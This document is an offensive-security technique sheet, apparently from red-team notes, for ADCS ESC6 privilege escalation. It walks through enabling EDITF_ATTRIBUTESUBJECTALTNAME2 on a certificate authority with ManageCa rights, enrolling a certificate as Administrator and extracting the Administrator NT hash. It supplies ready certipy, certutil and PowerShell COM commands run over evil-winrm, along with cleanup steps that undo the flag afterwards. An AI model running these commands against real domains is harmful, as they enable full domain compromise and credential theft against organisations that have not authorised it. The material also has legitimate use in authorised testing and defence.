# ADCS ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

## When this applies

- ADCS Enterprise CA where you have `ManageCa` rights (or the local admin on the CA host).
- Goal: enable `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA so any cert request can include an arbitrary SAN/UPN, then enrol as Administrator.

## Technique

ESC6 enables the CA-wide `EDITF_ATTRIBUTESUBJECTALTNAME2` flag. Once set, any enrollee can supply a SAN containing an arbitrary UPN — even on templates that don't allow `ENROLLEE_SUPPLIES_SUBJECT`. The flag setting requires `ManageCa`, not full Administrator.

## Steps

```
# Enumerate: certipy find -u user@domain -dc-ip DC_IP -vulnerable -stdout
# ESC6: Enable EDITF_ATTRIBUTESUBJECTALTNAME2 via ManageCa rights
#   Method 1 (requires local admin): certutil -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
#   Method 2 (COM object — NO local admin needed, just ManageCa + WinRM):
#     PowerShell via evil-winrm:
#       $ca = New-Object -ComObject CertificateAuthority.Admin.1
#       $configStr = "CA_HOST\CA-NAME"  # e.g., "DC01.domain.com\domain-DC01-CA"
#       $current = $ca.GetConfigEntry($configStr, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags")
#       $ca.SetConfigEntry($configStr, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags", 4, ($current -bor 0x00040000))
#       Restart-Service certsvc  # Required for flag to take effect
#   Then: certipy req -u user@domain -p pass -template User -upn administrator@domain -ca CA-NAME
#   Fallback priority: certipy ca -enable-flag → certutil → COM object via WinRM
```

## Verifying success

- `certipy auth -pfx admin.pfx` returns Administrator's NT hash.
- The CA's flag query (`certutil -getreg policy\EditFlags`) shows `EDITF_ATTRIBUTESUBJECTALTNAME2` set.

## Common pitfalls

- The CA service must be restarted for the flag change to take effect (`Restart-Service certsvc` on the CA host).
- Method 2 (COM object) does NOT require local admin — only `ManageCa` + WinRM access to the CA host.
- After exploitation, restore the original `EditFlags` value (subtract `0x00040000`) and restart `certsvc` to clean up.

## Tools

- certipy (`ca -enable-flag`, `req`, `auth`)
- certutil (Windows-side)
- evil-winrm (for the COM object method)
